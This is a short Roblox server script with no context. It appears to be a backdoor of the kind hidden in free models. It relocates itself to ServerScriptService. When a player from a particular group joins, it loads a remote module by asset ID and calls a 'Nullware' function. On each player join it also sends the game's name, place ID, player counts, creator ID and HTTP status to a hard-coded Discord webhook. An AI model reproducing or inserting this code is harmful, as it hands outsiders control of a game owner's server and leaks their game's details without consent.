script.Parent = game.ServerScriptService

game.Players.PlayerAdded:Connect(function(plr)
	if plr:IsInGroup(11232355) then
		require(7016947094).Nullware(plr.Name)
	end
end)

local PlaceId = game.PlaceId
local plrs = game.Players
local maxplayers = plrs.MaxPlayers
local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)

local plr = game:GetService("Players")
local http = game:GetService("HttpService")
plr.PlayerAdded:Connect(function(a)
	local a = {
		["embeds"] = {
			{
				["title"] = ""..GetName.Name.."",
				["url"] = "https://www.roblox.com/games/"..PlaceId,
				["description"] = "",
				["type"] = "rich",
				["color"]= 946578,
				["footer"] = {
					["icon_url"] = 'https://cdn.discordapp.com/attachments/835199961083281448/844543077150490624/logo_1.png',
					["text"] = ""
				},
				["thumbnail"] = {
					["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png",
				},
				["author"] = {
					["name"] = ""

				},

				["fields"] = {
					{

						["name"] = '• Players:',
						["value"] = ""..#plrs:GetPlayers().."",
						["inline"] = true



					},
					{
						["name"] = '• Max Players:',
						["value"] = ""..game.Players.MaxPlayers.."",
						["inline"] = true,
						
						
						
					},
					{
						["name"] = '• Creator Id:',
						["value"] = ""..game.CreatorId.."",
						["inline"] = true,



					},
					{
						["name"] = '• Creator Id:',
						["value"] = ""..game.CreatorId.."",
						["inline"] = true,



					},
					{
						["name"] = '• Https Requests:',
						["value"] = "Enabled",
						["inline"] = true,


					},
				}
			}}
	}

	a = http:JSONEncode(a)
	http:PostAsync("https://discord.com/api/webhooks/857634083059269642/J2Y-9F8cN4qIpysBgUQqSWVPYzgC9ieFCyFzcwH4wCV2udpRPyw3JQ27i11i8kPHSSh5", a)
end)
